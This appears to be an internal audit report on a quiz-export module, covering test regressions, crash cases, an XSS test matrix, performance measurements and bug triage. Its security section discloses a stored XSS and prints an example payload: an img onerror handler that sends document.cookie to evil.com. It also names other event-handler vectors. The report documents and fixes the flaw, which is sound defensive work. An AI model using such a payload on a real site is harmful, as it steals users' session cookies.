# Sprint 6.4-E1 — Quiz Resilience, Security & Performance Audit Report

**Date:** 2026-06-14  
**Commit baseline:** `f46d03c` (6.4-D0-Patch)  
**Auditor:** Automated audit suite (318 tests)  
**Status:** PARTIAL — P0 and P1 bugs found, must fix before E2

---

## A. Baseline Regression

### Test Execution

```bash
Command: npx vitest run
Date: 2026-06-14T12:53Z
Commit: f46d03c
```

| Metric | Count |
|--------|------:|
| Total test files | 30 |
| Passing test files | 23 |
| Failing test files | 7 |
| Total tests | 856 |
| Passing tests | 844 |
| Failing tests | 12 |

### Quiz-Specific Tests

| Test File | Tests | Status |
|-----------|:-----:|:------:|
| `quiz-contract.test.ts` | 68 | ✅ ALL PASS |
| `quiz-resilience-audit.test.ts` | 56 | ✅ ALL PASS |
| `quiz-security-audit.test.ts` | 162 | ✅ ALL PASS |
| `quiz-performance-audit.test.ts` | 32 | ✅ ALL PASS |

### Pre-existing Failures (NOT caused by quiz module work)

| Test File | Failing Test Names | Count | Error | Before Sprint | After Sprint | Related to Kuis? | Owner/Status |
|-----------|-------------------|:------:|-------|:-------------:|:------------:|:-----------------:|-------------|
| `block-registry.test.ts` | should have exactly 43 block types registered | 1 | Expected 43, received 31 | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should register all expected block types | 1 | Missing 12 block types | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should have required metadata fields for every block type | 1 | Missing metadata for 12 types | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should have non-empty names and icons | 1 | Missing names/icons for 12 types | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should have valid category for every block type | 1 | Missing categories for 12 types | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should have property schema for every block type | 1 | Missing schemas for 12 types | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should have valid property schema structure | 1 | Invalid schemas for 12 types | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should return an object from createDefault for every block type | 1 | Cannot read createDefault of undefined | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | should include a title in default content | 1 | Cannot read properties of undefined | FAIL | FAIL | No | Parkir |
| `block-registry.test.ts` | getAllBlockMeta should return all block metadata | 1 | Expected 43, received 31 | FAIL | FAIL | No | Parkir |
| `token-compliance.test.ts` | should have zero critical violations in all renderer blocks | 1 | Expected 0, received 2 | FAIL | FAIL | No | Parkir |
| `token-compliance.test.ts` | should have no TOKEN_TRANSITION_ALL violations in renderer blocks | 1 | AccordionRenderer.tsx has transition-all | FAIL | FAIL | No | Parkir |

### E2E/Store Failures (import-time errors, no tests run)

| Test File | Error | Before Sprint | After Sprint | Related to Kuis? | Owner/Status |
|-----------|-------|:-------------:|:------------:|:-----------------:|-------------|
| `composition-analyzer-e2e.test.ts` | TypeError: blocks.slice is not a function | FAIL | FAIL | No | Parkir |
| `rhythm-bridge-e2e.test.ts` | TypeError: Cannot read properties of undefined (reading 'intentScore') | FAIL | FAIL | No | Parkir |
| `store-slices.test.ts` | TypeError: createPageSlice is not a function | FAIL | FAIL | No | Parkir |
| `template-mutation-isolation.test.ts` | Error: Cannot find module '@/store/dirty-store' | FAIL | FAIL | No | Parkir |
| `visual-linter-e2e.test.ts` | TypeError: scoreToGrade is not a function | FAIL | FAIL | No | Parkir |

### Production Build

```
Status: ✅ PASS
Command: npx next build
Result: Successful build with no errors
```

### Regression Verdict

**No new regressions.** All 12 pre-existing failures are identical before and after E1 audit work. The 4 new quiz audit test files add 250 tests, all passing.

---

## B. Resilience Matrix

### Crash Scenarios (render throws error)

| ID | Block Type | Input | Error | Severity |
|----|-----------|-------|-------|:--------:|
| R1 | kuis | `questions: [null, undefined]` | Cannot read properties of null (reading 'ans') | 🔴 P1 |
| R2 | kuis | `q` field missing on question | Cannot read properties of undefined (reading 'replace') | 🔴 P1 |
| R3 | kuis | `opts` contains non-string values | str.replace is not a function | 🔴 P1 |
| R4 | true-false | `questions: [null, undefined]` | Cannot read properties of null (reading 'text') | 🔴 P1 |
| R5 | fill-blank | `questions: [null, undefined]` | Cannot read properties of null (reading 'text') | 🔴 P1 |
| R6 | fill-blank | `answer` field missing | Cannot read properties of undefined (reading 'replace') | 🔴 P1 |
| R7 | fill-blank | `text` field missing | Cannot read properties of undefined (reading 'split') | 🔴 P1 |
| R8 | all | `block.id` is a number (not string) | rawId.replace is not a function | 🟡 P2 |

### Non-Crash But Broken Behavior

| ID | Block Type | Input | Problem | Severity |
|----|-----------|-------|---------|:--------:|
| R9 | kuis | `ans: 99` (out of range) | Renders `data-ans="99"` — no validation, always wrong at runtime | 🟡 P2 |
| R10 | kuis | `ans: -1` (negative) | Renders `data-ans="-1"` — no validation | 🟡 P2 |
| R11 | kuis | `ans: "A"` (string legacy) | Produces `checkAnswer(this,0,0,A)` — A is undefined variable, runtime crash on click | 🔴 P1 |
| R12 | kuis | `opts: []` (empty) | Unanswerable question with no error indication | 🟡 P2 |
| R13 | true-false | `correct: 1` (number not boolean) | Renders `data-correct="1"` — runtime comparison breaks | 🟡 P2 |
| R14 | true-false | `correct: "true"` (string) | Fragile comparison at runtime | 🟡 P2 |
| R15 | true-false | `correct` field missing | Renders `data-correct="undefined"` — runtime breaks | 🟡 P2 |
| R16 | fill-blank | Multiple `___` in one question | All blanks share same `data-idx`, feedback overwritten | 🟡 P2 |
| R17 | fill-blank | No `___` placeholder in text | No input field rendered, unanswerable with no indication | 🟡 P2 |

### Duplicate DOM ID Scenarios

| ID | Scenario | Impact | Severity |
|----|----------|--------|:--------:|
| R18 | Two kuis blocks with same `block.id` | All derived IDs collide (progress, feedback, completion) | 🟡 P2 |
| R19 | Two TF blocks with same `block.id` | Same — all game IDs collide | 🟡 P2 |
| R20 | Two FB blocks with same `block.id` | Same — all game IDs collide | 🟡 P2 |

### Resilient Scenarios (properly handled)

| ID | Scenario | Handling |
|----|----------|----------|
| R21 | `variant` undefined | Falls back to 'A' via `normalizeKuisVariant()` ✅ |
| R22 | `variant` invalid ("X", "Z") | Falls back to 'A' ✅ |
| R23 | `title` empty/missing | Falls back to default ("Kuis", "Benar atau Salah", "Isian Singkat") ✅ |
| R24 | `block.id` missing | Falls back to `Math.random()` (non-deterministic but doesn't crash) ✅ |
| R25 | `explanation` empty string | Conditional rendering, omitted from DOM ✅ |
| R26 | `hint` missing (fill-blank) | Falls back to '...' placeholder ✅ |
| R27 | Very long text (500+ chars) | Renders correctly, no truncation ✅ |
| R28 | Unicode/emoji in text | Renders correctly via `escapeHtml()` ✅ |

---

## C. Security Matrix

### XSS Injection Tests (10 payloads × 14 fields = 140 injection tests)

| Block Type | Field | HTML Source Level | Runtime DOM Level | Status |
|-----------|-------|:-----------------:|:-----------------:|:------:|
| Kuis | `title` | ✅ Escaped | ✅ Safe | PASS |
| Kuis | `questions[].q` | ✅ Escaped | ✅ Safe | PASS |
| Kuis | `questions[].opts[]` | ✅ Escaped | ✅ Safe | PASS |
| Kuis | `questions[].ex` | ✅ Escaped | ✅ Safe | PASS |
| True-False | `title` | ✅ Escaped | ✅ Safe | PASS |
| True-False | `questions[].text` | ✅ Escaped | ✅ Safe | PASS |
| True-False | `questions[].explanation` | ✅ Escaped | ✅ Safe | PASS |
| Fill-Blank | `title` | ✅ Escaped | ✅ Safe | PASS |
| Fill-Blank | `questions[].text` | ✅ Escaped | ✅ Safe | PASS |
| Fill-Blank | `questions[].answer` (data-answer attr) | ✅ Escaped | 🔴 **VULNERABLE** | FAIL |
| Fill-Blank | `questions[].hint` (placeholder attr) | ✅ Escaped | ✅ Safe | PASS |

### Confirmed Vulnerability: Fill-Blank Answer XSS (P0)

**Location:** `scripts.ts` line 479  
**Vector:** `input.dataset.answer` → `innerHTML` insertion

**Chain:**
1. Renderer stores answer via `escapeHtml(q.answer)` → `data-answer="&lt;script&gt;..."` (looks safe)
2. DOM auto-decodes HTML entities in data attributes: `input.dataset.answer` returns `<script>...`
3. Runtime JS: `fb.innerHTML = '...Jawaban: ' + input.dataset.answer + '</span>'` — inserts decoded raw HTML
4. `<script>` via innerHTML does NOT execute, but `<img src=x onerror="...">`, `<svg onload="...">`, `<details open ontoggle="...">` **DO execute**

**Exploit:** An attacker sets fill-blank answer to `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">`. When a student answers incorrectly, the onerror fires and exfiltrates cookies.

**Fix required:**
```js
// Replace line 479 in scripts.ts:
// OLD: fb.innerHTML = '<span style="color:#ff6b6b;">✗ Salah. Jawaban: ' + input.dataset.answer + '</span>';
// NEW:
fb.textContent = '';
var wrongSpan = document.createElement('span');
wrongSpan.style.color = '#ff6b6b';
wrongSpan.textContent = '✗ Salah. Jawaban: ' + input.dataset.answer;
fb.appendChild(wrongSpan);
```

### Import Pipeline

| Stage | Behavior | Status |
|-------|----------|:------:|
| `parseKuisImportJSON()` | Parses JSON, does not strip HTML | ✅ Correct |
| `validateKuisImportPayload()` | Validates structure/types, does not sanitize HTML | ✅ Correct |
| `mapKuisImportToPatch()` | Trims strings, does not strip HTML | ✅ Correct |
| `renderQuizBlock()` | Applies `escapeHtml()` to all fields | ✅ Correct |

The import pipeline correctly delegates sanitization to the renderer. No HTML stripping is needed at import time.

### Other Security Observations

| Concern | Location | Status |
|---------|----------|:------:|
| `sanitizeHtml()` event handler regex bypass | RichText.tsx line 65 | 🟡 P2 — regex doesn't catch unquoted/backtick event handlers |
| `sanitizeHtml()` allows `<span>` with attributes | RichText.tsx line 72 | 🟡 P2 — `style="background:url(javascript:...)"` could pass through |
| `safeRichText()` strips all attributes | block-renderers.ts | ✅ Better approach, used for DefBox export |
| JSON embedding prevents `</script>` injection | index.ts line 90-93 | ✅ `<` replaced with `\u003c` |

---

## D. Performance Measurements

### Render Performance

| Scenario | Questions | Avg Render Time | HTML Size | DOM Nodes | Scaling |
|----------|:---------:|:---------------:|:---------:|:---------:|:-------:|
| 1 block × 10 soal | 10 | 0.038 ms | 13.7 KB | 143 | Baseline |
| 1 block × 100 soal | 100 | 0.402 ms | 123.3 KB | 1,313 | ~10× ✅ |
| 10 block × 20 soal | 200 | 0.51 ms total | 255.3 KB | 2,830 | Linear ✅ |
| 10 soal + explanation panjang | 10 | 0.04 ms | 33.5 KB | 143 | +20 KB for explanations |
| Fill-blank 10 × 3 blanks | 10 | 0.021 ms | ~8 KB | ~60 | Fast ✅ |

**No O(n²) patterns detected.** ID scaling R² = 1.0000. Bytes/question converges to ~1,258 at scale.

### Bundle Size

| Asset | Size | Quiz-specific | Other game code |
|-------|------|:-------------:|:---------------:|
| JS (`getJs()`) | 42.3 KB | 13.4% | 82.1% |
| CSS (`getCss()`) | 41.8 KB | 11.4% | 82.4% |

**Concern:** Monolithic bundle — all game logic shipped regardless of which block types exist on the page. A page with only 1 kuis block still ships 84 KB of JS+CSS (82% of which is non-quiz game code).

### Timer/Listener Analysis

| Type | Count | Stored? | Clearable? | Leak Risk |
|------|:-----:|:--------:|:----------:|:---------:|
| `setTimeout` | 5 | No | No | Low (stale callbacks silently fail) |
| `requestAnimationFrame` | 8 | No | No | None (one-shot by design) |
| `addEventListener` | 4 | No | No | None for standalone export |

**Confetti cleanup:** ✅ Correct — `setTimeout(p.remove(), 3500)` cleans up all 40 confetti pieces.

**Replay state reset:** ✅ Correct — all three replay functions (`replayKuis`, `replayTF`, `replayFB`) properly reset their state objects.

### Multi-Blank Fill-Blank Issue

When a question has multiple `___` placeholders, all input fields share the same `data-idx`. The feedback div is also shared (`fb-fb-{fbId}-{idx}`), meaning only the last blank's feedback is visible. This is a **functional bug** (P2) but not a performance issue.

---

## E. Bug Triage — P0 / P1 / P2

### 🔴 P0 — Must fix before E2

| ID | Bug | File | Impact | E2 Criterion Affected |
|----|-----|------|--------|----------------------|
| **P0-1** | Fill-blank answer XSS via innerHTML | `scripts.ts:479` | Stored XSS — attacker can execute arbitrary JS when student answers incorrectly | #4: XSS payload tidak dapat dieksekusi |

### 🟡 P1 — Must fix before E2 (main path)

| ID | Bug | File | Impact | E2 Criterion Affected |
|----|-----|------|--------|----------------------|
| **P1-1** | Crash on null/undefined questions | `quiz-renderers.ts:61,104,141` | Malformed data crashes entire export | #5: Data rusak tidak menjatuhkan seluruh export |
| **P1-2** | Crash on missing question fields (q, text, answer) | `quiz-renderers.ts` + `utils.ts:63` | Missing `q.q`, `q.text`, `q.answer` crashes via `escapeHtml(undefined)` | #5: Data rusak tidak menjatuhkan seluruh export |
| **P1-3** | Crash on non-string opts | `quiz-renderers.ts:85` | `escapeHtml(42)` throws | #5: Data rusak tidak menjatuhkan seluruh export |
| **P1-4** | Legacy string answer ("A","B") produces invalid JS | `quiz-renderers.ts:83` | `checkAnswer(this,0,0,A)` — A is undefined variable, runtime crash on click | #5: Data rusak tidak menjatuhkan seluruh export |
| **P1-5** | Missing/malformed ID not deterministic | `quiz-renderers.ts:34` | `Math.random()` fallback produces different IDs per render | #3: Missing/malformed ID punya perilaku deterministik atau fail-safe |

### 🟢 P2 — Park for future sprint

| ID | Bug | File | Impact |
|----|-----|------|--------|
| P2-1 | `block.id` as number crashes `stableBlockId` | `quiz-renderers.ts:24` | Non-string ID causes `.replace()` crash |
| P2-2 | `ans` out of range not validated | `quiz-renderers.ts:79` | Always-wrong answer at runtime |
| P2-3 | `opts: []` produces unanswerable question | `quiz-renderers.ts:81` | No error indication |
| P2-4 | `correct` non-boolean in true-false | `quiz-renderers.ts:122` | Fragile runtime comparison |
| P2-5 | Multiple `___` share `data-idx` | `quiz-renderers.ts:154` | Feedback overwritten for earlier blanks |
| P2-6 | No `___` placeholder renders no input | `quiz-renderers.ts:155` | Unanswerable question, no error indication |
| P2-7 | Duplicate block.id produces duplicate DOM IDs | `quiz-renderers.ts:20-35` | ID collision, DOM invalid |
| P2-8 | Monolithic JS/CSS bundle | `scripts.ts`, `styles.ts` | 82% unused code shipped |
| P2-9 | `sanitizeHtml()` regex bypass | `RichText.tsx:65` | Unquoted event handlers not caught |
| P2-10 | `setTimeout` not stored/clearable | `scripts.ts` (5 locations) | Stale callbacks on rapid navigation |

---

## F. Fix vs. Park Decision

### Must Fix Before E2 Acceptance (6 items)

| Bug | Fix Strategy | Effort |
|-----|-------------|--------|
| **P0-1** Fill-blank XSS | Replace `innerHTML` with `textContent`/`createElement` in `scripts.ts:479` | Small |
| **P1-1** Null questions crash | Filter null/undefined entries from `questions` array before `.map()` | Small |
| **P1-2** Missing fields crash | Guard `escapeHtml()` with null-safe wrapper: `escapeHtml(String(val ?? ''))` | Small |
| **P1-3** Non-string opts crash | Coerce opts to string: `String(opt)` before `escapeHtml()` | Small |
| **P1-4** Legacy string answer | Normalize `ans` in renderer: if string "A"→0, "B"→1, etc. | Small |
| **P1-5** Non-deterministic fallback | Use context ordinal (pageIndex + blockIndex) as fallback instead of Math.random() | Medium |

### Park for Future Sprint (10 items)

All P2 items. None block E2 acceptance criteria. Most are edge cases that don't occur in normal production flow (schema-healer ensures valid data).

---

## G. Keputusan Sprint 6.4-E1

### Status: **PARTIAL**

| E2 Entry Criterion | Status | Notes |
|-------------------|:------:|-------|
| 1. Tidak ada P0 | ❌ | P0-1: Fill-blank XSS via innerHTML |
| 2. Tidak ada P1 pada jalur utama | ❌ | P1-1 through P1-5: Crashes on malformed data |
| 3. Missing/malformed ID punya perilaku deterministik atau fail-safe | ❌ | Math.random() fallback is non-deterministic |
| 4. XSS payload tidak dapat dieksekusi | ❌ | Fill-blank answer XSS confirmed executable |
| 5. Data rusak tidak menjatuhkan seluruh export | ❌ | Null questions/missing fields crash the renderer |
| 6. Banyak soal/blok tetap dapat dimainkan | ✅ | 100 soal × 1 blok = 0.4ms render, linear scaling |
| 7. Baseline test memiliki angka pasti | ✅ | 12 failures documented with exact names and errors |
| 8. Tidak ada regression baru | ✅ | All 12 failures are pre-existing |

**3 of 8 criteria PASS. 5 of 8 criteria require fixes.**

### Next Action

Sprint **6.4-E1-Patch** needed to fix P0-1 and P1-1 through P1-5 before proceeding to E2. The fixes are well-scoped and small — primarily defensive guards in the renderers and one innerHTML→textContent change in scripts.ts.

### Estimated Fix Scope

- Files to modify: `quiz-renderers.ts`, `scripts.ts`, `utils.ts`
- Estimated changes: ~30 lines of code
- New tests needed: XSS regression test for fill-blank, null-safe renderer tests
- No changes to: variant CSS, state machine logic, ARIA, flow
